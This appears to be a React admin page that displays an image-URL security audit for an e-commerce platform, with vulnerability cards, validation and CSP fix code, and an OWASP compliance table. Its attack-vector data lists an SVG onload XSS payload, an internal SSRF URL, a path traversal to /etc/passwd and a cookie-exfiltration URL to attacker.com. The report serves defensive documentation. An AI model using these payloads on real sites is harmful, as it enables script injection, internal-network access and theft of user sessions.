import { useState, useMemo } from "react";
import { Link } from "wouter";
import { Input } from "@/components/ui/input";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import {
  Search,
  Shield,
  AlertTriangle,
  AlertCircle,
  CheckCircle2,
  ChevronRight,
  FileText,
  Database,
  Code,
  Lock,
  Eye,
  Printer,
  ArrowLeft,
  ExternalLink,
  Copy,
  Check,
} from "lucide-react";
import { toast } from "sonner";

// Security report data structure
const securityReport = {
  meta: {
    title: "Image URL Security & Validation Report",
    platform: "Urban Refit Platform",
    generated: "February 1, 2026",
    status: "Comprehensive Audit Complete",
  },
  summary: {
    securityPosture: "Moderate",
    criticalVulnerabilities: 2,
    highPriorityIssues: 3,
    mediumPriorityIssues: 4,
    validationCoverage: "75%",
  },
  sections: [
    {
      id: "executive-summary",
      title: "Executive Summary",
      icon: "FileText",
    },
    {
      id: "database-audit",
      title: "Database Audit Results",
      icon: "Database",
    },
    {
      id: "validation-rules",
      title: "Validation Rules & Implementation",
      icon: "Code",
    },
    {
      id: "vulnerabilities",
      title: "Security Vulnerabilities",
      icon: "AlertTriangle",
    },
    {
      id: "recommendations",
      title: "Security Recommendations",
      icon: "Shield",
    },
    {
      id: "compliance",
      title: "Compliance & Best Practices",
      icon: "CheckCircle2",
    },
    {
      id: "dashboard-status",
      title: "Validation Dashboard Status",
      icon: "Eye",
    },
    {
      id: "migration-path",
      title: "Migration Path for External URLs",
      icon: "ExternalLink",
    },
    {
      id: "testing",
      title: "Testing Recommendations",
      icon: "Code",
    },
  ],
  vulnerabilities: [
    {
      id: "vuln-1",
      title: "No Input Sanitization on User-Uploaded Image URLs",
      severity: "critical",
      cvss: "8.2",
      affected: "Sell submissions, product reviews",
      description: "The platform accepts image URLs from users without validation, enabling XSS and SSRF attacks.",
      attackVectors: [
        "XSS via SVG Images: data:image/svg+xml,<svg onload=alert('XSS')>",
        "SSRF: http://internal-server:8080/admin",
        "Malicious Redirect: https://malicious-site.com/redirect",
        "Data Exfiltration: https://attacker.com/steal?cookie=<script>",
      ],
    },
    {
      id: "vuln-2",
      title: "No File Existence Verification for Local Paths",
      severity: "critical",
      cvss: "7.5",
      affected: "All local image paths (/products/*, /blog/*)",
      description: "The validation function accepts any path starting with / without verifying the file exists.",
      attackVectors: [
        "Path Traversal: /../../../../etc/passwd",
        "Information Disclosure: /admin/secret-data.png",
      ],
    },
    {
      id: "vuln-3",
      title: "No Content-Type Validation",
      severity: "high",
      cvss: "6.8",
      affected: "All external image URLs",
      description: "The validation function only checks HTTP status code, not Content-Type header.",
      attackVectors: [
        "URL returns HTML/JavaScript instead of image",
        "Browser executes non-image content",
      ],
    },
    {
      id: "vuln-4",
      title: "No Domain Whitelist for External URLs",
      severity: "high",
      cvss: "6.5",
      affected: "All external image URLs",
      description: "The platform accepts image URLs from ANY external domain without restrictions.",
      attackVectors: [
        "Dependency on untrusted sources",
        "Privacy leakage via external tracking",
        "Performance degradation from slow servers",
      ],
    },
    {
      id: "vuln-5",
      title: "No Rate Limiting on Validation Endpoint",
      severity: "medium",
      cvss: "5.3",
      affected: "/api/admin/validate-images",
      description: "The validation endpoint makes HTTP requests without rate limiting.",
      attackVectors: [
        "DDoS amplification",
        "Resource exhaustion",
      ],
    },
    {
      id: "vuln-6",
      title: "Duplicate Image URLs",
      severity: "medium",
      cvss: "4.2",
      affected: "Product images",
      description: "Database contains duplicate image URLs across different products.",
      attackVectors: [
        "Data integrity issues",
        "Inventory management confusion",
      ],
    },
    {
      id: "vuln-7",
      title: "No Validation on Upload",
      severity: "medium",
      cvss: "5.5",
      affected: "Product creation, blog post creation",
      description: "Image URLs are only validated manually via admin dashboard.",
      attackVectors: [
        "Broken URLs saved to database",
        "Users see broken images immediately",
      ],
    },
    {
      id: "vuln-8",
      title: "No Automated Validation Schedule",
      severity: "low",
      cvss: "3.1",
      affected: "Validation monitoring system",
      description: "The validation system requires manual trigger with no automated checks.",
      attackVectors: [
        "Broken images go undetected",
        "External URLs become unavailable without notice",
      ],
    },
  ],
  recommendations: [
    {
      id: "rec-1",
      priority: "critical",
      title: "Implement Strict URL Validation for User Uploads",
      timeline: "Week 1",
      effort: "4 hours",
      code: `const imageUrlSchema = z.string().refine((url) => {
  if (url.startsWith('/')) {
    return /^\\/[a-zA-Z0-9_\\-\\/\\.]+\\.(jpg|jpeg|png|webp|gif)$/i.test(url);
  }
  const allowedDomains = [
    'd2xsxph8kpxj0f.cloudfront.net',
    's3.amazonaws.com',
  ];
  try {
    const urlObj = new URL(url);
    if (urlObj.protocol !== 'https:') return false;
    return allowedDomains.some(d => urlObj.hostname.endsWith(d));
  } catch { return false; }
});`,
    },
    {
      id: "rec-2",
      priority: "critical",
      title: "Add File Existence Check for Local Paths",
      timeline: "Week 1",
      effort: "2 hours",
      code: `if (url.startsWith('/')) {
  try {
    const filePath = join(process.cwd(), 'client', 'public', url);
    await access(filePath);
  } catch {
    isValid = false;
    errorType = 'http_error';
    errorMessage = 'Local file does not exist';
  }
}`,
    },
    {
      id: "rec-3",
      priority: "high",
      title: "Add Content-Type Verification",
      timeline: "Week 2",
      effort: "2 hours",
      code: `const contentType = response.headers.get('content-type');
const validImageTypes = ['image/jpeg', 'image/png', 'image/webp', 'image/gif'];
if (!contentType || !validImageTypes.some(t => contentType.includes(t))) {
  isValid = false;
  errorType = 'invalid_format';
  errorMessage = \`Invalid Content-Type: \${contentType}\`;
}`,
    },
    {
      id: "rec-4",
      priority: "high",
      title: "Implement Content Security Policy",
      timeline: "Week 2",
      effort: "1 hour",
      code: `app.use((req, res, next) => {
  res.setHeader('Content-Security-Policy',
    "default-src 'self'; " +
    "img-src 'self' https://d2xsxph8kpxj0f.cloudfront.net data:; " +
    "script-src 'self' 'unsafe-inline';"
  );
  next();
});`,
    },
    {
      id: "rec-5",
      priority: "high",
      title: "Add Rate Limiting",
      timeline: "Week 2",
      effort: "1 hour",
      code: `const validationLimiter = rateLimit({
  windowMs: 5 * 60 * 1000, // 5 minutes
  max: 1,
  message: 'Validation can only be run once every 5 minutes',
});
router.post('/validate-images', validationLimiter, handler);`,
    },
  ],
  databaseAudit: {
    products: {
      total: 8,
      withImage1: 8,
      withImage2: 5,
      localPaths: 8,
      externalUrls: 0,
      nullImage1: 0,
      nullImage2: 3,
    },
    blogPosts: {
      total: 5,
      withFeaturedImage: 5,
      localPaths: 5,
      externalUrls: 0,
      nullImages: 0,
    },
  },
  owaspCompliance: [
    { vulnerability: "A03:2021 – Injection", status: "partial", note: "XSS risk via SVG images" },
    { vulnerability: "A05:2021 – Security Misconfiguration", status: "non-compliant", note: "No CSP headers" },
    { vulnerability: "A07:2021 – Auth Failures", status: "compliant", note: "OAuth-based auth secure" },
    { vulnerability: "A08:2021 – Integrity Failures", status: "partial", note: "No content verification" },
    { vulnerability: "A10:2021 – SSRF", status: "non-compliant", note: "User URLs not validated" },
  ],
};

// Severity badge component
function SeverityBadge({ severity }: { severity: string }) {
  const variants: Record<string, { variant: "destructive" | "default" | "secondary" | "outline"; label: string }> = {
    critical: { variant: "destructive", label: "CRITICAL" },
    high: { variant: "destructive", label: "HIGH" },
    medium: { variant: "default", label: "MEDIUM" },
    low: { variant: "secondary", label: "LOW" },
  };
  const config = variants[severity] || variants.medium;
  return <Badge variant={config.variant}>{config.label}</Badge>;
}

// Code block component with copy functionality
function CodeBlock({ code, language = "typescript" }: { code: string; language?: string }) {
  const [copied, setCopied] = useState(false);

  const handleCopy = () => {
    navigator.clipboard.writeText(code);
    setCopied(true);
    toast.success("Code copied to clipboard");
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <div className="relative group">
      <pre className="bg-zinc-900 text-zinc-100 p-4 rounded-lg overflow-x-auto text-sm font-mono">
        <code>{code}</code>
      </pre>
      <Button
        variant="ghost"
        size="sm"
        className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 transition-opacity"
        onClick={handleCopy}
      >
        {copied ? <Check className="h-4 w-4" /> : <Copy className="h-4 w-4" />}
      </Button>
    </div>
  );
}

export default function SecurityDocs() {
  const [searchQuery, setSearchQuery] = useState("");
  const [activeSection, setActiveSection] = useState("executive-summary");
  const [priorityFilter, setPriorityFilter] = useState<string | null>(null);

  // Filter vulnerabilities based on search and priority
  const filteredVulnerabilities = useMemo(() => {
    return securityReport.vulnerabilities.filter((vuln) => {
      const matchesSearch =
        searchQuery === "" ||
        vuln.title.toLowerCase().includes(searchQuery.toLowerCase()) ||
        vuln.description.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesPriority = !priorityFilter || vuln.severity === priorityFilter;
      return matchesSearch && matchesPriority;
    });
  }, [searchQuery, priorityFilter]);

  // Filter recommendations based on search and priority
  const filteredRecommendations = useMemo(() => {
    return securityReport.recommendations.filter((rec) => {
      const matchesSearch =
        searchQuery === "" ||
        rec.title.toLowerCase().includes(searchQuery.toLowerCase());
      const matchesPriority = !priorityFilter || rec.priority === priorityFilter;
      return matchesSearch && matchesPriority;
    });
  }, [searchQuery, priorityFilter]);

  const handlePrint = () => {
    window.print();
  };

  const getIcon = (iconName: string) => {
    const icons: Record<string, React.ReactNode> = {
      FileText: <FileText className="h-4 w-4" />,
      Database: <Database className="h-4 w-4" />,
      Code: <Code className="h-4 w-4" />,
      AlertTriangle: <AlertTriangle className="h-4 w-4" />,
      Shield: <Shield className="h-4 w-4" />,
      CheckCircle2: <CheckCircle2 className="h-4 w-4" />,
      Eye: <Eye className="h-4 w-4" />,
      ExternalLink: <ExternalLink className="h-4 w-4" />,
    };
    return icons[iconName] || <FileText className="h-4 w-4" />;
  };

  return (
    <div className="min-h-screen bg-background">
      {/* Header */}
      <header className="sticky top-0 z-50 bg-background/95 backdrop-blur border-b">
        <div className="container flex items-center justify-between h-16">
          <div className="flex items-center gap-4">
            <Link href="/admin">
              <Button variant="ghost" size="sm">
                <ArrowLeft className="h-4 w-4 mr-2" />
                Back to Admin
              </Button>
            </Link>
            <div className="flex items-center gap-2">
              <Shield className="h-5 w-5 text-primary" />
              <h1 className="font-semibold">Security Documentation</h1>
            </div>
          </div>
          <div className="flex items-center gap-2">
            <Button variant="outline" size="sm" onClick={handlePrint}>
              <Printer className="h-4 w-4 mr-2" />
              Print
            </Button>
          </div>
        </div>
      </header>

      <div className="container py-6">
        <div className="flex gap-6">
          {/* Sidebar Navigation */}
          <aside className="w-64 shrink-0 hidden lg:block">
            <div className="sticky top-24 space-y-4">
              {/* Search */}
              <div className="relative">
                <Search className="absolute left-3 top-1/2 -translate-y-1/2 h-4 w-4 text-muted-foreground" />
                <Input
                  placeholder="Search documentation..."
                  value={searchQuery}
                  onChange={(e) => setSearchQuery(e.target.value)}
                  className="pl-9"
                />
              </div>

              {/* Priority Filter */}
              <div className="space-y-2">
                <p className="text-sm font-medium text-muted-foreground">Filter by Priority</p>
                <div className="flex flex-wrap gap-1">
                  {["critical", "high", "medium", "low"].map((priority) => (
                    <Button
                      key={priority}
                      variant={priorityFilter === priority ? "default" : "outline"}
                      size="sm"
                      onClick={() => setPriorityFilter(priorityFilter === priority ? null : priority)}
                      className="text-xs capitalize"
                    >
                      {priority}
                    </Button>
                  ))}
                </div>
              </div>

              {/* Table of Contents */}
              <nav className="space-y-1">
                <p className="text-sm font-medium text-muted-foreground mb-2">Contents</p>
                {securityReport.sections.map((section) => (
                  <button
                    key={section.id}
                    onClick={() => {
                      setActiveSection(section.id);
                      document.getElementById(section.id)?.scrollIntoView({ behavior: "smooth" });
                    }}
                    className={`w-full flex items-center gap-2 px-3 py-2 text-sm rounded-md transition-colors ${
                      activeSection === section.id
                        ? "bg-primary text-primary-foreground"
                        : "hover:bg-muted"
                    }`}
                  >
                    {getIcon(section.icon)}
                    <span className="truncate">{section.title}</span>
                  </button>
                ))}
              </nav>

              {/* Quick Stats */}
              <Card>
                <CardHeader className="pb-2">
                  <CardTitle className="text-sm">Quick Stats</CardTitle>
                </CardHeader>
                <CardContent className="space-y-2 text-sm">
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Security Posture</span>
                    <Badge variant="outline">{securityReport.summary.securityPosture}</Badge>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Critical Issues</span>
                    <span className="font-medium text-destructive">{securityReport.summary.criticalVulnerabilities}</span>
                  </div>
                  <div className="flex justify-between">
                    <span className="text-muted-foreground">Coverage</span>
                    <span className="font-medium">{securityReport.summary.validationCoverage}</span>
                  </div>
                </CardContent>
              </Card>
            </div>
          </aside>

          {/* Main Content */}
          <main className="flex-1 min-w-0">
            {/* Report Header */}
            <div className="mb-8">
              <h1 className="text-3xl font-bold mb-2">{securityReport.meta.title}</h1>
              <div className="flex flex-wrap items-center gap-4 text-sm text-muted-foreground">
                <span>{securityReport.meta.platform}</span>
                <span>•</span>
                <span>Generated: {securityReport.meta.generated}</span>
                <span>•</span>
                <Badge variant="outline" className="text-green-600 border-green-600">
                  {securityReport.meta.status}
                </Badge>
              </div>
            </div>

            {/* Executive Summary */}
            <section id="executive-summary" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <FileText className="h-6 w-6" />
                Executive Summary
              </h2>
              <p className="text-muted-foreground mb-6">
                This report provides a comprehensive analysis of image URL handling across the Urban Refit platform,
                covering validation rules, current implementation status, identified vulnerabilities, and security recommendations.
              </p>

              {/* Summary Cards */}
              <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4 mb-6">
                <Card>
                  <CardContent className="pt-6">
                    <div className="text-2xl font-bold text-destructive">{securityReport.summary.criticalVulnerabilities}</div>
                    <p className="text-sm text-muted-foreground">Critical Vulnerabilities</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardContent className="pt-6">
                    <div className="text-2xl font-bold text-orange-500">{securityReport.summary.highPriorityIssues}</div>
                    <p className="text-sm text-muted-foreground">High-Priority Issues</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardContent className="pt-6">
                    <div className="text-2xl font-bold text-yellow-500">{securityReport.summary.mediumPriorityIssues}</div>
                    <p className="text-sm text-muted-foreground">Medium-Priority Issues</p>
                  </CardContent>
                </Card>
                <Card>
                  <CardContent className="pt-6">
                    <div className="text-2xl font-bold text-green-500">{securityReport.summary.validationCoverage}</div>
                    <p className="text-sm text-muted-foreground">Validation Coverage</p>
                  </CardContent>
                </Card>
              </div>
            </section>

            {/* Database Audit */}
            <section id="database-audit" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Database className="h-6 w-6" />
                Database Audit Results
              </h2>

              <Tabs defaultValue="products" className="w-full">
                <TabsList>
                  <TabsTrigger value="products">Product Images</TabsTrigger>
                  <TabsTrigger value="blog">Blog Images</TabsTrigger>
                </TabsList>
                <TabsContent value="products">
                  <Card>
                    <CardContent className="pt-6">
                      <div className="overflow-x-auto">
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b">
                              <th className="text-left py-2 font-medium">Metric</th>
                              <th className="text-right py-2 font-medium">Count</th>
                              <th className="text-right py-2 font-medium">Percentage</th>
                            </tr>
                          </thead>
                          <tbody>
                            <tr className="border-b">
                              <td className="py-2">Total Products</td>
                              <td className="text-right">{securityReport.databaseAudit.products.total}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">Products with image1Url</td>
                              <td className="text-right">{securityReport.databaseAudit.products.withImage1}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">Products with image2Url</td>
                              <td className="text-right">{securityReport.databaseAudit.products.withImage2}</td>
                              <td className="text-right">62.5%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">Local path images</td>
                              <td className="text-right">{securityReport.databaseAudit.products.localPaths}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">External URLs</td>
                              <td className="text-right">{securityReport.databaseAudit.products.externalUrls}</td>
                              <td className="text-right">0%</td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
                <TabsContent value="blog">
                  <Card>
                    <CardContent className="pt-6">
                      <div className="overflow-x-auto">
                        <table className="w-full text-sm">
                          <thead>
                            <tr className="border-b">
                              <th className="text-left py-2 font-medium">Metric</th>
                              <th className="text-right py-2 font-medium">Count</th>
                              <th className="text-right py-2 font-medium">Percentage</th>
                            </tr>
                          </thead>
                          <tbody>
                            <tr className="border-b">
                              <td className="py-2">Total Blog Posts</td>
                              <td className="text-right">{securityReport.databaseAudit.blogPosts.total}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">Posts with featuredImageUrl</td>
                              <td className="text-right">{securityReport.databaseAudit.blogPosts.withFeaturedImage}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">Local path images</td>
                              <td className="text-right">{securityReport.databaseAudit.blogPosts.localPaths}</td>
                              <td className="text-right">100%</td>
                            </tr>
                            <tr className="border-b">
                              <td className="py-2">External URLs</td>
                              <td className="text-right">{securityReport.databaseAudit.blogPosts.externalUrls}</td>
                              <td className="text-right">0%</td>
                            </tr>
                          </tbody>
                        </table>
                      </div>
                    </CardContent>
                  </Card>
                </TabsContent>
              </Tabs>
            </section>

            {/* Vulnerabilities */}
            <section id="vulnerabilities" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <AlertTriangle className="h-6 w-6" />
                Security Vulnerabilities
              </h2>
              <p className="text-muted-foreground mb-6">
                {filteredVulnerabilities.length} vulnerabilities found
                {searchQuery && ` matching "${searchQuery}"`}
                {priorityFilter && ` with ${priorityFilter} priority`}
              </p>

              <div className="space-y-4">
                {filteredVulnerabilities.map((vuln) => (
                  <Card key={vuln.id} className="overflow-hidden">
                    <CardHeader className="pb-2">
                      <div className="flex items-start justify-between gap-4">
                        <div>
                          <CardTitle className="text-lg flex items-center gap-2">
                            {vuln.severity === "critical" && <AlertCircle className="h-5 w-5 text-destructive" />}
                            {vuln.severity === "high" && <AlertTriangle className="h-5 w-5 text-orange-500" />}
                            {vuln.severity === "medium" && <AlertTriangle className="h-5 w-5 text-yellow-500" />}
                            {vuln.severity === "low" && <AlertCircle className="h-5 w-5 text-blue-500" />}
                            {vuln.title}
                          </CardTitle>
                          <CardDescription className="mt-1">
                            Affected: {vuln.affected}
                          </CardDescription>
                        </div>
                        <div className="flex items-center gap-2">
                          <SeverityBadge severity={vuln.severity} />
                          <Badge variant="outline">CVSS: {vuln.cvss}</Badge>
                        </div>
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm text-muted-foreground mb-4">{vuln.description}</p>
                      <div>
                        <p className="text-sm font-medium mb-2">Attack Vectors:</p>
                        <ul className="text-sm text-muted-foreground space-y-1">
                          {vuln.attackVectors.map((vector, i) => (
                            <li key={i} className="flex items-start gap-2">
                              <ChevronRight className="h-4 w-4 mt-0.5 shrink-0" />
                              <code className="text-xs bg-muted px-1 py-0.5 rounded">{vector}</code>
                            </li>
                          ))}
                        </ul>
                      </div>
                    </CardContent>
                  </Card>
                ))}
              </div>
            </section>

            {/* Recommendations */}
            <section id="recommendations" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Shield className="h-6 w-6" />
                Security Recommendations
              </h2>
              <p className="text-muted-foreground mb-6">
                Prioritized action plan with code examples for implementation.
              </p>

              <div className="space-y-6">
                {filteredRecommendations.map((rec, index) => (
                  <Card key={rec.id}>
                    <CardHeader>
                      <div className="flex items-start justify-between gap-4">
                        <div>
                          <CardTitle className="text-lg">
                            {index + 1}. {rec.title}
                          </CardTitle>
                          <CardDescription className="mt-1">
                            Timeline: {rec.timeline} • Effort: {rec.effort}
                          </CardDescription>
                        </div>
                        <SeverityBadge severity={rec.priority} />
                      </div>
                    </CardHeader>
                    <CardContent>
                      <p className="text-sm font-medium mb-2">Implementation Code:</p>
                      <CodeBlock code={rec.code} />
                    </CardContent>
                  </Card>
                ))}
              </div>
            </section>

            {/* OWASP Compliance */}
            <section id="compliance" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <CheckCircle2 className="h-6 w-6" />
                OWASP Top 10 Compliance
              </h2>

              <Card>
                <CardContent className="pt-6">
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b">
                          <th className="text-left py-2 font-medium">Vulnerability</th>
                          <th className="text-center py-2 font-medium">Status</th>
                          <th className="text-left py-2 font-medium">Notes</th>
                        </tr>
                      </thead>
                      <tbody>
                        {securityReport.owaspCompliance.map((item, i) => (
                          <tr key={i} className="border-b">
                            <td className="py-2">{item.vulnerability}</td>
                            <td className="text-center">
                              {item.status === "compliant" && (
                                <Badge variant="outline" className="text-green-600 border-green-600">Compliant</Badge>
                              )}
                              {item.status === "partial" && (
                                <Badge variant="outline" className="text-yellow-600 border-yellow-600">Partial</Badge>
                              )}
                              {item.status === "non-compliant" && (
                                <Badge variant="destructive">Non-Compliant</Badge>
                              )}
                            </td>
                            <td className="py-2 text-muted-foreground">{item.note}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                </CardContent>
              </Card>
            </section>

            {/* Action Plan */}
            <section id="action-plan" className="mb-12 scroll-mt-24">
              <h2 className="text-2xl font-bold mb-4 flex items-center gap-2">
                <Lock className="h-6 w-6" />
                Priority Action Plan
              </h2>

              <Card>
                <CardContent className="pt-6">
                  <div className="overflow-x-auto">
                    <table className="w-full text-sm">
                      <thead>
                        <tr className="border-b">
                          <th className="text-left py-2 font-medium">Priority</th>
                          <th className="text-left py-2 font-medium">Action</th>
                          <th className="text-left py-2 font-medium">Timeline</th>
                          <th className="text-left py-2 font-medium">Effort</th>
                        </tr>
                      </thead>
                      <tbody>
                        {securityReport.recommendations.map((rec) => (
                          <tr key={rec.id} className="border-b">
                            <td className="py-2">
                              <SeverityBadge severity={rec.priority} />
                            </td>
                            <td className="py-2">{rec.title}</td>
                            <td className="py-2 text-muted-foreground">{rec.timeline}</td>
                            <td className="py-2 text-muted-foreground">{rec.effort}</td>
                          </tr>
                        ))}
                      </tbody>
                    </table>
                  </div>
                  <p className="text-sm text-muted-foreground mt-4">
                    <strong>Total Estimated Effort:</strong> 20 hours over 5 weeks
                  </p>
                </CardContent>
              </Card>
            </section>

            {/* Footer */}
            <footer className="border-t pt-6 mt-12 text-sm text-muted-foreground">
              <p>Report Generated By: Manus AI Agent</p>
              <p>Report Version: 1.0</p>
              <p>Last Updated: {securityReport.meta.generated}</p>
            </footer>
          </main>
        </div>
      </div>
    </div>
  );
}
